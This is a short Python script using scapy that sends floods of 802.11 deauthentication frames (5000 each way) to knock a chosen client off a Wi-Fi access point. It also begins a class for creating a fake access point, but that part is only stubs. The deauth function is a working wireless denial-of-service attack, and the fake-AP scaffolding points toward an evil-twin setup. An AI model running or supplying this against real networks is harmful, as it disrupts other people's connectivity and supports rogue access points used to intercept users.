from  scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth


def deauthentication_packet(interface, net_mac, client_mac):
    # deauthentication packets
    # if addr = 'ff:ff:ff:ff:ff:ff' than will disconnect all the cliens. harmful!
    # reason 3 - because sending station is leaving 
    # or has left independent Basic Service Service Set (IBSS) or ESS
    ap_deauth = RadioTap()/Dot11(addr1=client_mac, addr2=net_mac, addr3=net_mac)/Dot11Deauth()
    cli_deauth = RadioTap()/Dot11(addr1=net_mac, addr2=client_mac, addr3=client_mac)/Dot11Deauth()

    print('\nsend deauthentication packet...')

    sendp(ap_deauth, count=5000, iface=interface)
    sendp(cli_deauth, count=5000, iface=interface)


class Fake:
    def __init__(self, interface, net_mac, cli_mac):
        self.interface = interface
        self.net_mac = net_mac
        self.cli_mac = cli_mac
        print('\ncreating fake ap')

    def fake_ap(self):
        print('\ncreate fake access point')
        self.create_enviroment()
    
    def create_enviroment(self):
        print('\ncreating necessary files...')